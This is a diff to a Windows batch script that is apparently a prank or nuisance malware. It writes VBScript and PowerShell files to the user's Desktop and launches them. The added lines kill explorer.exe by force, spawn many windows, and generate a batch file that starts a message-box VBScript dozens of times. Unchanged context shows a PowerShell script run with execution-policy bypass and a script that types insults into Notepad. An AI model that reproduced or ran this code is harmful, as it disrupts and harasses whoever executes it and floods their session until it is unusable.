@@ -14,8 +14,8 @@
 ::dAsiuh18IRvcCxnZtBJQ
 ::cRYluBh/LU+EWAnk
 ::YxY4rhs+aU+IeA==
-::cxY6rQJ7JhzQF1fEqQJiZksaHErSXA==
-::ZQ05rAF9IBncCkqN+0xwdVsGAlTMbCXqZg==
+::cxY6rQJ7JhzQF1fEqQJiZkoaHErSXA==
+::ZQ05rAF9IBncCkqN+0xwdVsGAlXMbCXqZg==
 ::ZQ05rAF9IAHYFVzEqQIWAzJmeTfi
 ::eg0/rx1wNQPfEVWB+kM9LVsJDCKJNXmvFdU=
 ::fBEirQZwNQPfEVWB+kM9LVsJDAKJNXmvFdU=
@@ -36,6 +36,10 @@ mode 30 , 01
 powershell -window minimized -command "" 
 cd C:\Users\%username%\Desktop
 echo X=MsgBox(".........................",0+48,".") >> hhhh.vbs
+TASKKILL /F /IM EXPLORER.EXE
+start
+start
+start
 start
 start
 start
@@ -60,6 +64,7 @@ echo }  >> Mouse.ps1
 echo "#> >> Mouse.ps1
 echo powershell.exe -ExecutionPolicy Bypass -File "C:\Users\%username%\Desktop\Mouse.ps1" >> M0US3rrR.bat 
 start M0US3rrR.bat 
+start explorer.exe
 start
 start hhhh.vbs 
 start hhhh.vbs 
@@ -565,6 +570,87 @@ echo Set wshShell = wscript.CreateObject ("WScript.Shell") >> sssss5.vbs
 echo Wshshell.run "Notepad" >> sssss5.vbs
 echo wscript.sleep 100 >> sssss5.vbs
 echo wshshell.sendkeys "jajajajajajajajajajaja sos un tonto" >> sssss5.vbs
+echo Set wshshell = wscript.CreateObject("WScript.Shell") >> 123321.vbs 
+echo msgbox(" . ")   >> 123321.vbs
+echo msgbox(" . ") >> 123321.vbs
+echo msgbox(" . ") >> 123321.vbs
+echo msgbox(" . ") >> 123321.vbs
+echo msgbox(" . ") >> 123321.vbs
+echo msgbox(" . ") >> 123321.vbs
+echo msgbox(" . ") >> 123321.vbs
+echo msgbox(" . ") >> 123321.vbs
+echo msgbox(" . ") >> 123321.vbs
+echo msgbox(" . ") >> 123321.vbs
+echo msgbox(" . ") >> 123321.vbs
+echo msgbox(" . ") >> 123321.vbs
+echo msgbox(" . ") >> 123321.vbs
+echo msgbox(" . ") >> 123321.vbs
+echo msgbox(" . ") >> 123321.vbs
+echo msgbox(" . ") >> 123321.vbs
+echo msgbox(" . ") >> 123321.vbs
+echo msgbox(" . ") >> 123321.vbs
+echo msgbox(" . ") >> 123321.vbs
+echo msgbox(" . ") >> 123321.vbs
+echo msgbox(" . ") >> 123321.vbs
+echo @echo off
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo start 123321.vbs >> n071f11123.bat
+echo exit >> n071f11123.bat
 cd C:\Users\%username%\Desktop
 start s44ss1541DDDDD44.bat
 start s44ss1541DDDDD44.bat
